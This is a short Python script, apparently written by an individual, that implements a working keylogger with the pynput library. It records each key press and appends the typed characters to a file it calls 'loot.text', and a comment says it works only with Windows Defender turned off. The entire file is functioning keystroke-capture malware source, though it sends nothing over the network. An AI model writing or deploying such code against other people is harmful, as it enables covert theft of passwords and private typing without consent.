# -*- coding: utf-8 -*-
"""
Spyder Editor

Bradley Sheldon
01/29/2024

"""
# Simple Python keylogger
# this only works if windows defender is deactivated


from pynput import keyboard


def key_pressed(key):
    print(str(key))
    
    with open("loot.text", 'a') as logkey:
        try:
            char=key.char
            logkey.write(char)
        except:
            print("There was an error getting character.")



if __name__=="__main__":
    listener=keyboard.Listener(on_press=key_pressed)
    listener.start()
    input()
    
    

